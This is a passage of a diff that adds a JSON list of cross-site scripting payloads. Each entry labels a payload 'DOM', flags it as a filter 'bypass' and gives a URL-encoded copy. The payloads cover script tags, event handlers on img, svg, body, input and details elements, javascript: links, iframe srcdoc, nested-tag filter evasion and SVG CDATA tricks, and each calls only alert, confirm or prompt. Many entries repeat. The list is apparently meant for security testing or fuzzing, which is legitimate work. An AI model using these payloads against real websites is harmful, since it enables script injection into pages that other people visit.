+      "payload": "\u003ca href=\"javascript:confirm(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=confirm(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dconfirm%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(4)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%284%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(4)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%284%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(4)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%284%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(4)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%284%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=prompt(4)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dprompt%284%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(4)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%284%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(4)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%284%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(5)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Ealert%285%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(5)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%285%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(5)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%285%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(5)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%285%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(5)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%285%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=alert(5)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dalert%285%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(5)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%285%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
